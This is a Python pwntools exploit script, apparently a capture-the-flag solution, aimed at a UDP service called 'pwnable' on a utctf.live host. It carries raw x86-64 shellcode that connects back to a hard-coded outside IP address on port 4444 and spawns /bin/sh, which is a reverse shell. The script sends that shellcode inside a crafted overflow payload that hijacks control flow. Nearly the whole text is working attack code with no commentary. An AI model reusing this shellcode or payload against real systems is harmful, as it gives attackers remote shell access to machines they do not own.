from pwn import *

e = ELF("./pwnable")

context.binary = e

if "--remote" in sys.argv:
  p = remote("binary.utctf.live", 54, typ="udp")
else:
  p = remote("localhost", 9000, typ="udp")

apay = "\x68\x36\xd5\xa1\xdb\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x6a\x10\x6a\x29\x6a\x01\x6a\x02\x5f\x5e\x48\x31\xd2\x58\x0f\x05\x48\x89\xc7\x5a\x58\x48\x89\xe6\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05"

print(hex(len(apay)))

pay = "A" * 0xf + p64(0x100) * 2 + p64(0x603300) + p32(0x100) * 2 + "A" * 8 + p64(0x400d19)
p.sendline("\x00" * 2 * 2 + "\x01\x00" + "\x00" * 2 * 3 + "\xf0" + apay.ljust(0xf0, "\x00") + p8(len(pay)) + pay + "\x00")


p.interactive()
